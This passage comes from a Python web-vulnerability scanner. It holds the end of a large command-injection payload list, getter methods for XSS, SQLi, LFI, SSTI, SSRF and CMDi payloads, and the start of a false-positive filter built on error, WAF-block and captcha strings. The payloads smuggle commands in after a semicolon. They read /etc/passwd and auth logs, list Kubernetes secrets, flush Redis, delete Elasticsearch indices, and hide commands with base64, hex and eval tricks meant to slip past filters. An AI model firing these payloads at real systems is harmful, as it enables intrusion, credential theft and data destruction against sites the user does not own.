        (';redis-cli --version', 'Redis Version'),
        (';redis-cli INFO', 'Redis Info'),
        (';redis-cli CONFIG GET *', 'Redis Config'),
        (';redis-cli KEYS "*"', 'Redis Keys'),
        (';redis-cli FLUSHALL', 'Redis Flush'),
        (';mongod --version', 'MongoDB Version'),
        (';mongo --eval "db.version()"', 'MongoDB Version Query'),
        (';mongo --eval "db.adminCommand({listDatabases:1})"', 'MongoDB List DBs'),
        (';mongo --eval "db.getUsers()"', 'MongoDB Users'),
        (';mongoexport --db test --collection users', 'MongoDB Export'),
        (';cqlsh --version', 'Cassandra Version'),
        (';cqlsh -e "SELECT release_version FROM system.local"', 'Cassandra Query'),
        (';clickhouse-client --version', 'ClickHouse Version'),
        (';clickhouse-client -q "SELECT version()"', 'ClickHouse Query'),
        (';influx --version', 'InfluxDB Version'),
        (';influx -execute "SHOW DATABASES"', 'InfluxDB Query'),
        (';elasticsearch --version', 'Elasticsearch Version'),
        (';curl http://localhost:9200/', 'ES Root'),
        (';curl http://localhost:9200/_cat/indices', 'ES Indices'),
        (';curl http://localhost:9200/_search?q=*:*', 'ES Search All'),
        (';curl -X PUT http://localhost:9200/test', 'ES Create Index'),
        (';curl -X DELETE http://localhost:9200/test', 'ES Delete Index'),
        (';curl -s http://localhost:9200/_nodes/stats', 'ES Node Stats'),
        (';curl -s http://localhost:9200/_cluster/health', 'ES Cluster Health'),
        
        # ==================== 751-800: WEB SERVER COMMANDS ====================
        (';apache2 -v', 'Apache Version'),
        (';apache2ctl -S', 'Apache Virtual Hosts'),
        (';apache2ctl -M', 'Apache Modules'),
        (';httpd -v', 'HTTPD Version'),
        (';httpd -S', 'HTTPD Virtual Hosts'),
        (';nginx -v', 'Nginx Version'),
        (';nginx -T', 'Nginx Config'),
        (';nginx -t', 'Nginx Test Config'),
        (';php -v', 'PHP Version'),
        (';php -m', 'PHP Modules'),
        (';php -i', 'PHP Info'),
        (';php -r "phpinfo();"', 'PHP PHPInfo'),
        (';python --version', 'Python Version'),
        (';python3 --version', 'Python3 Version'),
        (';pip list', 'Pip List'),
        (';pip freeze', 'Pip Freeze'),
        (';node -v', 'Node Version'),
        (';npm -v', 'NPM Version'),
        (';npm list -g', 'NPM Global List'),
        (';yarn -v', 'Yarn Version'),
        (';ruby -v', 'Ruby Version'),
        (';gem list', 'Gem List'),
        (';perl -v', 'Perl Version'),
        (';go version', 'Go Version'),
        (';rustc --version', 'Rust Version'),
        (';java -version', 'Java Version'),
        (';javac -version', 'Javac Version'),
        (';mvn -version', 'Maven Version'),
        (';gradle -v', 'Gradle Version'),
        (';docker --version', 'Docker Version'),
        (';docker ps', 'Docker PS'),
        (';docker ps -a', 'Docker All'),
        (';docker images', 'Docker Images'),
        (';docker network ls', 'Docker Networks'),
        (';docker volume ls', 'Docker Volumes'),
        (';docker-compose --version', 'Docker Compose Version'),
        (';docker-compose ps', 'Docker Compose PS'),
        (';docker-compose config', 'Docker Compose Config'),
        (';kubectl version', 'Kubectl Version'),
        (';kubectl get pods', 'Kubectl Pods'),
        (';kubectl get services', 'Kubectl Services'),
        (';kubectl get secrets', 'Kubectl Secrets'),
        (';kubectl get configmaps', 'Kubectl ConfigMaps'),
        (';kubectl get nodes', 'Kubectl Nodes'),
        (';kubectl get namespaces', 'Kubectl Namespaces'),
        (';minikube version', 'Minikube Version'),
        (';helm version', 'Helm Version'),
        (';helm list', 'Helm List'),
        (';terraform version', 'Terraform Version'),
        (';ansible --version', 'Ansible Version'),
        
        # ==================== 801-850: PACKAGE MANAGERS ====================
        (';apt --version', 'APT Version'),
        (';apt update', 'APT Update'),
        (';apt list --installed', 'APT List Installed'),
        (';apt search apache', 'APT Search'),
        (';apt-cache search apache', 'APTCache Search'),
        (';apt-cache show apache2', 'APTCache Show'),
        (';dpkg -l', 'DPKG List'),
        (';dpkg -s apache2', 'DPKG Status'),
        (';dpkg -L apache2', 'DPKG List Files'),
        (';yum --version', 'YUM Version'),
        (';yum list installed', 'YUM List Installed'),
        (';yum search apache', 'YUM Search'),
        (';yum info httpd', 'YUM Info'),
        (';rpm -qa', 'RPM Query All'),
        (';rpm -qi httpd', 'RPM Query Info'),
        (';rpm -ql httpd', 'RPM List Files'),
        (';dnf --version', 'DNF Version'),
        (';dnf list installed', 'DNF List'),
        (';dnf search apache', 'DNF Search'),
        (';zypper --version', 'Zypper Version'),
        (';zypper ps', 'Zypper PS'),
        (';zypper search apache', 'Zypper Search'),
        (';apk --version', 'APK Version'),
        (';apk list --installed', 'APK List'),
        (';apk search apache', 'APK Search'),
        (';pacman --version', 'Pacman Version'),
        (';pacman -Q', 'Pacman Query'),
        (';pacman -Qe', 'Pacman Explicit'),
        (';emerge --version', 'Emerge Version'),
        (';emerge --search apache', 'Emerge Search'),
        (';npm list -g', 'NPM Global List'),
        (';npm list', 'NPM List'),
        (';npm info express', 'NPM Info'),
        (';pip list', 'Pip List'),
        (';pip show requests', 'Pip Show'),
        (';pip3 list', 'Pip3 List'),
        (';gem list', 'Gem List'),
        (';gem list --local', 'Gem Local'),
        (';gem info rails', 'Gem Info'),
        (';cpan -l', 'CPAN List'),
        (';cpan -D CGI', 'CPAN Info'),
        (';cargo --version', 'Cargo Version'),
        (';cargo install --list', 'Cargo List'),
        (';go list all', 'Go List'),
        (';go version', 'Go Version'),
        (';composer --version', 'Composer Version'),
        (';composer show', 'Composer Show'),
        (';composer show -i', 'Composer Installed'),
        (';pear list', 'PEAR List'),
        (';pecl list', 'PECL List'),
        (';pear list-channels', 'PEAR Channels'),
        
        # ==================== 851-900: LOGS & DEBUGGING ====================
        (';cat /var/log/apache2/access.log', 'Apache Access'),
        (';cat /var/log/apache2/error.log', 'Apache Error'),
        (';cat /var/log/apache2/other_vhosts_access.log', 'Apache Other'),
        (';tail -f /var/log/apache2/access.log', 'Apache Tail'),
        (';cat /var/log/nginx/access.log', 'Nginx Access'),
        (';cat /var/log/nginx/error.log', 'Nginx Error'),
        (';cat /var/log/httpd/access_log', 'HTTPD Access'),
        (';cat /var/log/httpd/error_log', 'HTTPD Error'),
        (';cat /var/log/mysql/error.log', 'MySQL Error'),
        (';cat /var/log/mysql/mysql.log', 'MySQL Log'),
        (';cat /var/log/mysql/mysql-slow.log', 'MySQL Slow'),
        (';cat /var/log/postgresql/postgresql.log', 'PostgreSQL Log'),
        (';cat /var/log/redis/redis-server.log', 'Redis Log'),
        (';cat /var/log/mongodb/mongodb.log', 'MongoDB Log'),
        (';cat /var/log/elasticsearch/elasticsearch.log', 'ES Log'),
        (';cat /var/log/auth.log', 'Auth Log'),
        (';cat /var/log/secure', 'Secure Log'),
        (';cat /var/log/syslog', 'Syslog'),
        (';cat /var/log/messages', 'Messages'),
        (';cat /var/log/kern.log', 'Kernel Log'),
        (';cat /var/log/dmesg', 'DMESG'),
        (';dmesg', 'DMESG Basic'),
        (';dmesg | tail -50', 'DMESG Tail'),
        (';journalctl -n 50', 'Journal Last 50'),
        (';journalctl -f', 'Journal Follow'),
        (';journalctl -u apache2', 'Journal Unit'),
        (';journalctl --since today', 'Journal Today'),
        (';journalctl -k', 'Journal Kernel'),
        (';logwatch --detail High', 'Logwatch'),
        (';logrotate -v', 'Logrotate Verbose'),
        (';logrotate -d /etc/logrotate.conf', 'Logrotate Debug'),
        (';strace -p 1234', 'Strace PID'),
        (';strace -f -e trace=file ls', 'Strace Files'),
        (';ltrace -p 1234', 'Ltrace PID'),
        (';ltrace ls', 'Ltrace LS'),
        (';gdb -p 1234', 'GDB Attach'),
        (';gdb --batch -ex "info threads" -p 1234', 'GDB Threads'),
        (';perf top', 'Perf Top'),
        (';perf stat ls', 'Perf Stat'),
        (';sar -u 1 3', 'SAR CPU'),
        (';sar -r 1 3', 'SAR Memory'),
        (';sar -n DEV 1 3', 'SAR Network'),
        (';iostat -x 1 3', 'IOStat'),
        (';mpstat -P ALL 1 3', 'MPStat'),
        (';pidstat 1 3', 'PIDStat'),
        (';lsof -i', 'LSOF Internet'),
        (';lsof -i :80', 'LSOF Port 80'),
        (';lsof -u www-data', 'LSOF User'),
        (';lsof -p 1234', 'LSOF PID'),
        (';lsof /var/log/apache2/error.log', 'LSOF File'),
        
        # ==================== 901-950: ENCODING & OBFUSCATION ADVANCED ====================
        (';echo "id" | base64 -d | sh', 'Base64 Decode Pipe'),
        (';echo "d2hvYW1pCg==" | base64 -d | sh', 'Base64 Whoami'),
        (';echo "Y2F0IC9ldGMvcGFzc3dkCg==" | base64 -d | sh', 'Base64 Cat'),
        (';echo "bHMgLWxhCg==" | base64 -d | sh', 'Base64 LS'),
        (';echo "cHdkCg==" | base64 -d | sh', 'Base64 PWD'),
        (';echo "aG9zdG5hbWUK" | base64 -d | sh', 'Base64 Hostname'),
        (';echo "dW5hbWUgLWEK" | base64 -d | sh', 'Base64 Uname'),
        (';echo "ZW52Cg==" | base64 -d | sh', 'Base64 Env'),
        (';echo "a2Fs" | xxd -r -p | sh', 'XXD Decode'),
        (';echo "77686f616d69" | xxd -r -p | sh', 'XXD Whoami'),
        (';echo "636174202f6574632f706173737764" | xxd -r -p | sh', 'XXD Cat'),
        (';echo "6c73202d6c61" | xxd -r -p | sh', 'XXD LS'),
        (';$(echo -e "\\x69\\x64")', 'Hex Echo'),
        (';$(echo -e "\\x77\\x68\\x6f\\x61\\x6d\\x69")', 'Hex Whoami'),
        (';$(echo -e "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64")', 'Hex Cat'),
        (';$(echo -e "\\x6c\\x73\\x20\\x2d\\x6c\\x61")', 'Hex LS'),
        (';printf "\\x69\\x64" | sh', 'Printf Hex'),
        (';printf "\\x77\\x68\\x6f\\x61\\x6d\\x69" | sh', 'Printf Hex Whoami'),
        (';printf "\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64" | sh', 'Printf Hex Cat'),
        (';$"\x69\x64"', 'Dollar Hex Command'),
        (';$"\x77\x68\x6f\x61\x6d\x69"', 'Dollar Hex Whoami'),
        (';$"\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"', 'Dollar Hex Cat'),
        (';${"\x69\x64"}', 'Braced Hex'),
        (';${"\x77\x68\x6f\x61\x6d\x69"}', 'Braced Hex Whoami'),
        (';${"\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"}', 'Braced Hex Cat'),
        (';id$()', 'Empty Sub'),
        (';id${}', 'Empty Braces'),
        (';whoami$()', 'Empty Sub Whoami'),
        (';cat$() /etc/passwd', 'Empty Sub Cat'),
        (';id${#}', 'Length Empty'),
        (';whoami${#}', 'Length Empty Whoami'),
        (';cat${#} /etc/passwd', 'Length Empty Cat'),
        (';${!#}', 'Last Arg'),
        (';${!-}', 'Dash Arg'),
        (';${!?}', 'Question Arg'),
        (';${!*}.', 'Star Arg'),
        (';${!@}.', 'At Arg'),
        (';${#-}', 'Length Dash'),
        (';${#?}', 'Length Question'),
        (';a=id;$a', 'Assign Command'),
        (';b=whoami;$b', 'Assign Whoami'),
        (';c=cat;d=/etc/passwd;$c $d', 'Assign Cat'),
        (';c=cat;d=/etc/passwd;eval "$c $d"', 'Assign Eval'),
        (';eval "id"', 'Eval Basic'),
        (';eval "whoami"', 'Eval Whoami'),
        (';eval "cat /etc/passwd"', 'Eval Cat'),
        (';eval \'id\'', 'Eval Single Quote'),
        (';eval \"id\"', 'Eval Double Quote'),
        (';eval `echo id`', 'Eval Backticks'),
        (';eval $(echo id)', 'Eval Dollar Sub'),
        
        # ==================== 951-1000: FINAL COVERAGE ====================
        (';python -c "import os; os.system(\'id\')"', 'Python System'),
        (';python -c "import os; os.system(\'whoami\')"', 'Python System Whoami'),
        (';python -c "import os; os.system(\'cat /etc/passwd\')"', 'Python System Cat'),
        (';python3 -c "import subprocess; subprocess.call([\'id\'])"', 'Python3 Subprocess'),
        (';python3 -c "import subprocess; subprocess.call([\'whoami\'])"', 'Python3 Whoami'),
        (';python3 -c "import subprocess; subprocess.call([\'cat\', \'/etc/passwd\'])"', 'Python3 Cat'),
        (';perl -e "system(\'id\')"', 'Perl System'),
        (';perl -e "system(\'whoami\')"', 'Perl Whoami'),
        (';perl -e "system(\'cat /etc/passwd\')"', 'Perl Cat'),
        (';php -r "system(\'id\');"', 'PHP System'),
        (';php -r "system(\'whoami\');"', 'PHP Whoami'),
        (';php -r "system(\'cat /etc/passwd\');"', 'PHP Cat'),
        (';ruby -e "system(\'id\')"', 'Ruby System'),
        (';ruby -e "system(\'whoami\')"', 'Ruby Whoami'),
        (';ruby -e "system(\'cat /etc/passwd\')"', 'Ruby Cat'),
        (';node -e "require(\'child_process\').execSync(\'id\')"', 'Node Exec'),
        (';node -e "require(\'child_process\').execSync(\'whoami\')"', 'Node Whoami'),
        (';node -e "require(\'child_process\').execSync(\'cat /etc/passwd\')"', 'Node Cat'),
        (';lua -e "os.execute(\'id\')"', 'Lua Execute'),
        (';lua -e "os.execute(\'whoami\')"', 'Lua Whoami'),
        (';lua -e "os.execute(\'cat /etc/passwd\')"', 'Lua Cat'),
        (';awk "BEGIN{system(\'id\')}"', 'Awk System'),
        (';awk "BEGIN{system(\'whoami\')}"', 'Awk Whoami'),
        (';awk "BEGIN{system(\'cat /etc/passwd\')}"', 'Awk Cat'),
        (';sed -n "s/.*/&/e" /etc/passwd', 'Sed Execute'),
        (';sed -n "s/.*/`id`/e" /dev/null', 'Sed Command'),
        (';grep "" /etc/passwd --exec=id 2>/dev/null', 'Grep Exec'),
        (';gcc -E -P -x c /dev/null -D"$(id)" 2>/dev/null', 'GCC Preprocessor'),
        (';gcc -E -P -x c /dev/null -D"$(whoami)" 2>/dev/null', 'GCC Whoami'),
        (';gcc -E -P -x c /dev/null -D"$(cat /etc/passwd)" 2>/dev/null', 'GCC Cat'),
        (';tar --checkpoint=1 --checkpoint-action=exec=id', 'Tar Checkpoint'),
        (';tar --checkpoint=1 --checkpoint-action=exec=whoami', 'Tar Checkpoint Whoami'),
        (';tar --checkpoint=1 --checkpoint-action=exec="cat /etc/passwd"', 'Tar Checkpoint Cat'),
        (';cpulimit -l 100 -z -- id', 'Cpulimit Exec'),
        (';cpulimit -l 100 -z -- whoami', 'Cpulimit Whoami'),
        (';cpulimit -l 100 -z -- cat /etc/passwd', 'Cpulimit Cat'),
        (';nice -n 19 id', 'Nice Exec'),
        (';nice -n 19 whoami', 'Nice Whoami'),
        (';nice -n 19 cat /etc/passwd', 'Nice Cat'),
        (';nohup id &', 'Nohup Exec'),
        (';nohup whoami &', 'Nohup Whoami'),
        (';nohup cat /etc/passwd &', 'Nohup Cat'),
        (';setsid id', 'Setsid Exec'),
        (';setsid whoami', 'Setsid Whoami'),
        (';setsid cat /etc/passwd', 'Setsid Cat'),
    ]

    @classmethod
    def get_xss_payloads(cls, count: int = 30) -> List[str]:
        """Get XSS payloads, randomized."""
        payloads = cls.XSS_PAYLOADS.copy()
        random.shuffle(payloads)
        return payloads[:count]
    
    @classmethod
    def get_sqli_payloads(cls, count: int = 20) -> List[Tuple[str, str]]:
        """Get SQLi payloads, randomized."""
        payloads = cls.SQLI_PAYLOADS.copy()
        random.shuffle(payloads)
        return payloads[:count]
    
    @classmethod
    def get_lfi_payloads(cls) -> List[str]:
        """Get all LFI payloads."""
        return cls.LFI_PAYLOADS.copy()
    
    @classmethod
    def get_ssti_payloads(cls) -> List[Tuple[str, str]]:
        """Get all SSTI payloads."""
        return cls.SSTI_PAYLOADS.copy()
    
    @classmethod
    def get_ssrf_payloads(cls) -> List[str]:
        """Get all SSRF payloads."""
        return cls.SSRF_PAYLOADS.copy()
    
    @classmethod
    def get_cmdi_payloads(cls) -> List[Tuple[str, str]]:
        """Get all CMDi payloads."""
        return cls.CMDI_PAYLOADS.copy()

# ═══════════════════════════════════════════════════════════════════════════════════════
# ANTI FALSE POSITIVE ENGINE — DARK EDITION (5-STAGE DEEP VALIDATION)
# ═══════════════════════════════════════════════════════════════════════════════════════

class FalsePositiveEngine:
    """
    5-Stage False Positive Elimination Engine.
    Uses response fingerprinting, DOM comparison, behavior analysis,
    and multi-step verification to eliminate 97%+ false positives.
    """
    
    # ─── Stage 0: Pre-filter ──────────────────────────────────────────────
    IMMUNE_PARAMETERS = {
        'csrf_token', '_csrf', 'csrf', 'xsrf', 'authenticity_token',
        'nonce', '_wpnonce', 'wpnonce', '_token', 'form_token',
        'timestamp', '_', 'cache_buster', 'cache', 'ver', 'version',
        'rand', 'random', 'seed', 'rnd', 'nocache', 'v', 't',
        'format', 'lang', 'locale', 'theme', 'skin', 'template',
        'callback', 'jsonp', 'jsoncallback', 'crossdomain',
        'action', 'controller', 'method', 'view', 'layout',
        'page', 'per_page', 'limit', 'offset', 'order', 'sort', 'dir',
        'utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content',
        'gclid', 'fbclid', 'msclkid', 'twclid', 'igshid',
        'ref', 'referrer', 'referer', 'source', 'medium',
        'session_id', 'sid', 'phpsessid', 'jsessionid', 'aspsessionid',
        'request_id', 'trace_id', 'correlation_id', 'x-request-id',
    }
    
    STATIC_CONTENT = {
        'image/', 'video/', 'audio/', 'font/',
        'text/css', 'text/csv', 'application/javascript',
        'application/octet-stream', 'application/pdf',
        'application/zip', 'application/gzip',
    }
    
    # ─── Stage 1: Error Page Patterns ─────────────────────────────────────
    ERROR_PATTERNS = {
        # ==================== 1-50: 404 NOT FOUND ====================
        '404': [
            'page not found',
            '404 not found',
            'error 404',
            'the page you requested',
            'no results found',
            'nothing found',
            'sorry, no posts',
            "we couldn't find",
            "couldn't find what you're looking for",
            "doesn't exist",
            'cannot be found',
            'not available',
            'the requested url was not found',
            'url not found on this server',
            'oops! that page can not be found',
            'page doesn\'t exist',
            'no file found',
            'the file was not found',
            'requested page could not be found',
            'page not available',
            'content not found',
            'resource not found',
            'document not found',
            'item not found',
            'record not found',
            'entry not found',
            'post not found',
            'article not found',
            'product not found',
            'category not found',
            '404 - page not found',
            '404 error - page not found',
            'http 404 - not found',
            '404 - not found',
            '404 not found error',
            '404 file not found',
            '404 page not found',
            'the requested url / was not found',
            'requested url not found',
            'url not found',
            'path not found',
            'route not found',
            'controller not found',
            'action not found',
            'view not found',
            'template not found',
            'layout not found',
            'partial not found',
            'component not found',
        ],
        
        # ==================== 51-100: 403 FORBIDDEN ====================
        '403': [
            'access denied',
            'forbidden',
            '403 forbidden',
            "you don't have permission",
            'not authorized',
            'insufficient permissions',
            'access forbidden',
            'you are not allowed',
            'permission denied',
            'requires authentication',
            'not permitted',
            'access to this resource is forbidden',
            'you do not have access',
            'unauthorized access',
            'access denied by policy',
            'forbidden access',
            'no permission to access',
            'insufficient privileges',
            'you are not authorized',
            'access to the requested resource is forbidden',
            '403 - access denied',
            '403 - forbidden',
            'http 403 - forbidden',
            '403 forbidden error',
            'forbidden you don\'t have permission',
            'access denied - 403',
            'error 403 - forbidden',
            '403 - access forbidden',
            'access to this page is forbidden',
            'you need permission',
            'access denied by administrator',
            'access restricted',
            'access denied by security policy',
            'ip address blocked',
            'ip has been blacklisted',
            'blocked due to security policy',
            'country blocked',
            'region not allowed',
            'access from your location is blocked',
            'access denied by geolocation policy',
            'user agent blocked',
            'browser not allowed',
            'device not authorized',
            'access from this device is blocked',
            'referrer not allowed',
            'access denied due to referrer policy',
            'hotlinking detected',
            'direct access not allowed',
            'access denied - no referrer',
        ],
        
        # ==================== 101-150: 500 INTERNAL SERVER ERROR ====================
        '500': [
            'internal server error',
            '500 internal server error',
            'unexpected error occurred',
            'something went wrong',
            'an error has occurred',
            'error occurred while processing',
            'the server encountered an internal error',
            'server error',
            'application error',
            'http 500 - internal server error',
            '500 - internal server error',
            'error 500',
            '500 internal error',
            'internal error',
            'server encountered an error',
            'server is currently unable to handle the request',
            'temporary error',
            'processing error',
            'system error',
            'runtime error',
            'unhandled exception',
            'exception occurred',
            'fatal error',
            'critical error',
            'uncaught exception',
            'error while executing',
            'execution failed',
            'operation failed',
            'request failed',
            'unable to complete request',
            'service unavailable',
            'database error',
            'connection error',
            'timeout error',
            'execution timeout',
            'maximum execution time exceeded',
            'memory exhausted',
            'out of memory',
            'memory limit exceeded',
            'stack overflow',
            'recursion limit reached',
            'deadlock detected',
            'deadlock found',
            'lock timeout',
            'transaction failed',
            'rollback performed',
            'integrity constraint violation',
            'foreign key constraint fails',
            'unique constraint violation',
            'duplicate entry',
        ],
        
        # ==================== 151-200: MAINTENANCE MODE ====================
        'maintenance': [
            'under maintenance',
            'coming soon',
            "we'll be back",
            'under construction',
            'temporarily unavailable',
            'site is currently unavailable',
            'down for maintenance',
            'maintenance mode',
            'scheduled maintenance',
            'system maintenance',
            'service maintenance',
            'maintenance in progress',
            'currently undergoing maintenance',
            'we are performing maintenance',
            'site is down for maintenance',
            'server is under maintenance',
            'application is under maintenance',
            'maintenance break',
            'technical maintenance',
            'planned maintenance',
            'emergency maintenance',
            'urgent maintenance',
            'maintenance window',
            'we will be back soon',
            'be right back',
            'brb',
            'site maintenance in progress',
            'database maintenance',
            'server maintenance',
            'upgrading system',
            'updating system',
            'patching system',
            'deploying new version',
            'migrating data',
            'backup in progress',
            'restoring backup',
            'loading data',
            'initializing system',
            'warming up',
            'starting up',
            'rebooting',
            'restarting service',
            'reloading configuration',
            'flushing cache',
            'rebuilding index',
            'optimizing database',
            'vacuuming database',
            'cleaning up temporary files',
            'archiving logs',
            'rolling deployment',
        ],
        
        # ==================== 201-250: RATE LIMITING ====================
        'rate_limit': [
            'rate limit exceeded',
            'too many requests',
            'slow down',
            'you are being rate limited',
            'api rate limit',
            'request limit reached',
            'quota exceeded',
            'too many attempts',
            'try again later',
            'please wait before',
            'maximum requests reached',
            'request throttled',
            'rate limited',
            'api limit exceeded',
            'daily limit exceeded',
            'hourly limit exceeded',
            'minute limit exceeded',
            'second limit exceeded',
            'concurrent request limit exceeded',
            'connection limit reached',
            'ip rate limit exceeded',
            'user rate limit exceeded',
            'account rate limit exceeded',
            'api key rate limit exceeded',
            'token rate limit exceeded',
            'session rate limit exceeded',
            'too many requests from your ip',
            'too many requests for this endpoint',
            'request quota exhausted',
            'api call quota exceeded',
            'monthly quota exceeded',
            'weekly quota exceeded',
            'burst limit exceeded',
            'throttling limit reached',
            'capacity exceeded',
            'request frequency too high',
            'please reduce request rate',
            'backoff required',
            'retry after',
            'retry later',
            'cooldown period',
            'rate limit reset in',
            'too many login attempts',
            'login attempts exceeded',
            'password attempts exceeded',
            'too many failed attempts',
            'account locked due to too many attempts',
            'temporary block due to excessive requests',
            'please wait before trying again',
            'you have been rate limited due to suspicious activity',
        ],
        
        # ==================== 251-300: CAPTCHA CHALLENGES ====================
        'captcha': [
            'captcha',
            'recaptcha',
            'hcaptcha',
            'verify you are human',
            'are you a robot',
            'please complete the captcha',
            'security check',
            'prove you are human',
            'challenge',
            'browser verification',
            'checking your browser',
            'enable javascript',
            'please enable cookies',
            'captcha verification',
            'captcha required',
            'captcha challenge',
            'security verification',
            'human verification',
            'verify your identity',
            'confirm you are human',
            'i am not a robot',
            'verify that you are not a robot',
            'please solve this captcha',
            'enter the captcha code',
            'type the characters you see',
            'input the captcha text',
            'complete the security check',
            'additional verification required',
            'we need to verify you are human',
            'please prove you are human',
            'verify your humanity',
            'anti-bot verification',
            'bot protection check',
            'spam protection',
            'automated request detected',
            'suspicious activity detected',
            'unusual traffic detected',
            'your connection appears to be automated',
            'bot behaviour detected',
            'automated access detected',
            'please verify to continue',
            'security verification required',
            'validation required',
            'verification challenge',
            'cloudflare challenge',
            'ddos protection check',
            'waiting for verification',
            'checking your browser before accessing',
            'please wait while we verify your browser',
            'we are checking your browser',
        ],
        
        # ==================== 301-350: WAF BLOCKS ====================
        'waf_block': [
            'blocked by waf',
            'request blocked',
            'firewall block',
            'security policy violation',
            'malicious request',
            'attack detected',
            'suspicious activity',
            'request forbidden by administrative rules',
            'not acceptable',
            'your request has been blocked',
            'ip has been blocked',
            'access from your ip',
            'blocked due to security reasons',
            'waf rule triggered',
            'modsecurity blocked',
            'mod_security violation',
            'security rule violation',
            'rule triggered',
            'signature match',
            'pattern match',
            'sql injection detected',
            'xss attack detected',
            'command injection attempt',
            'path traversal detected',
            'lfi attempt detected',
            'rfi attempt detected',
            'code injection detected',
            'header injection detected',
            'protocol violation',
            'invalid request',
            'malformed request',
            'bad request',
            'request rejected',
            'blocked by security policy',
            'security violation detected',
            'suspicious payload detected',
            'blacklisted pattern detected',
            'blacklisted user agent',
            'blacklisted ip',
            'blacklisted referrer',
            'whitelist violation',
            'geoip block',
            'rate limiting block',
            'dos protection triggered',
            'ddos mitigation active',
            'challenge required',
            'javascript challenge',
            'cookie challenge',
            'page challenge',
            'waiting for challenge completion',
        ],
        
        # ==================== 351-400: LOGIN/AUTHENTICATION ====================
        'login': [
            'please log in',
            'sign in to continue',
            'you must be logged in',
            'authentication required',
            'please login first',
            'you need to login',
            'unauthorized access',
            'session expired',
            'your session has expired',
            'please sign in',
            'login required',
            'authentication needed',
            'please authenticate',
            'you are not logged in',
            'not authenticated',
            'invalid credentials',
            'username or password incorrect',
            'invalid username or password',
            'wrong password',
            'invalid email or password',
            'login failed',
            'authentication failed',
            'invalid token',
            'token expired',
            'token invalid',
            'invalid api key',
            'api key invalid',
            'api key expired',
            'invalid session',
            'session expired please login again',
            'your session has timed out',
            'please re-login',
            'please login to continue',
            'you must sign in to access',
            'login to view this content',
            'authentication required to access this resource',
            'please provide valid credentials',
            'unauthorized request',
            'access token missing',
            'bearer token required',
            'authorization header missing',
            'invalid authorization header',
            'basic authentication required',
            'digest authentication required',
            'ntlm authentication required',
            'kerberos authentication required',
            'oauth authentication required',
            'jwt token missing',
            'jwt token invalid',
            'jwt token expired',
        ],
        
        # ==================== 401-450: SQL/DATABASE ERRORS ====================
        'sql_errors': [
            'sql syntax error',
            'mysql error',
            'postgresql error',
            'database query failed',
            'sqlite error',
            'mssql error',
            'oracle error',
            'you have an error in your sql syntax',
            'unclosed quotation mark',
            'quoted string not properly terminated',
            'unknown column',
            'table not found',
            'column not found',
            'invalid column name',
            'invalid table name',
            'ambiguous column',
            'duplicate entry for key',
            'primary key violation',
            'foreign key constraint fails',
            'cannot delete or update a parent row',
            'cannot add or update a child row',
            'data too long for column',
            'incorrect integer value',
            'incorrect date value',
            'incorrect datetime value',
            'invalid date format',
            'invalid number',
            'division by zero',
            'out of range value',
            'data truncation',
            'null value violates not-null constraint',
            'not null constraint failed',
            'check constraint violated',
            'unique constraint violated',
            'deadlock found when trying to get lock',
            'lock wait timeout exceeded',
            'connection refused',
            'could not connect to database',
            'database connection lost',
            'too many connections',
            'connection pool exhausted',
            'transaction is already active',
            'transaction is not active',
            'prepared statement already exists',
            'temporary table already exists',
            'view already exists',
            'trigger already exists',
            'procedure already exists',
            'function already exists',
            'index already exists',
        ],
        
        # ==================== 451-500: FILE/UPLOAD ERRORS ====================
        'file_errors': [
            'upload failed',
            'file too large',
            'maximum file size exceeded',
            'file type not allowed',
            'invalid file type',
            'file extension not allowed',
            'file upload error',
            'failed to upload file',
            'no file uploaded',
            'file is empty',
            'temporary file error',
            'cannot write file',
            'disk quota exceeded',
            'no space left on device',
            'permission denied writing file',
            'cannot create directory',
            'directory not writable',
            'file already exists',
            'cannot overwrite file',
            'invalid filename',
            'filename contains illegal characters',
            'path traversal detected in filename',
            'unsafe filename',
            'malicious file detected',
            'virus detected',
            'file contains malware',
            'file was not moved to final location',
            'partial upload',
            'upload timed out',
            'upload cancelled',
            'invalid file format',
            'corrupted file',
            'file is not a valid image',
            'image processing failed',
            'invalid image format',
            'image dimensions exceed limit',
            'image size too large',
            'image resize failed',
            'thumbnail generation failed',
            'cannot extract archive',
            'zip extraction failed',
            'invalid archive format',
            'archive contains dangerous files',
            'archive password protected',
            'unsupported archive format',
            'too many files in archive',
            'archive extraction timed out',
            'decompression failed',
            'cannot read uploaded file',
        ],
        
        # ==================== 501-550: API/JSON ERRORS ====================
        'api_errors': [
            'invalid json',
            'json parse error',
            'malformed json',
            'unexpected end of json input',
            'json syntax error',
            'invalid json format',
            'cannot parse request body',
            'request body is not valid json',
            'invalid xml',
            'xml parse error',
            'malformed xml',
            'invalid content type',
            'content type not supported',
            'unsupported media type',
            'accept header not supported',
            'missing required parameter',
            'required field missing',
            'missing required field',
            'invalid parameter value',
            'parameter validation failed',
            'validation error',
            'invalid request format',
            'bad request format',
            'schema validation failed',
            'does not match schema',
            'invalid data type',
            'expected string got number',
            'expected number got string',
            'expected boolean got string',
            'expected array got object',
            'expected object got array',
            'value out of bounds',
            'minimum value not met',
            'maximum value exceeded',
            'string too short',
            'string too long',
            'pattern mismatch',
            'email format invalid',
            'url format invalid',
            'uuid format invalid',
            'date format invalid',
            'time format invalid',
            'datetime format invalid',
            'enum value not allowed',
            'value not in allowed list',
            'duplicate entry in array',
            'unique items required',
            'array must contain at least one item',
            'array has too many items',
            'object has additional properties',
        ],
        
        # ==================== 551-600: NETWORK/TIMEOUT ERRORS ====================
        'network_errors': [
            'connection timed out',
            'request timeout',
            'gateway timeout',
            '504 gateway timeout',
            'timeout occurred',
            'operation timed out',
            'read timeout',
            'write timeout',
            'connect timeout',
            'socket timeout',
            'request took too long',
            'response too slow',
            'server not responding',
            'server unreachable',
            'host unreachable',
            'network unreachable',
            'no route to host',
            'connection refused',
            'connection reset',
            'connection aborted',
            'connection closed',
            'broken pipe',
            'ssl handshake failed',
            'tls handshake error',
            'certificate expired',
            'certificate invalid',
            'hostname mismatch',
            'self-signed certificate',
            'untrusted certificate',
            'ssl protocol error',
            'tls protocol error',
            'encryption error',
            'decryption failed',
            'invalid mac',
            'bad record mac',
            'unexpected message',
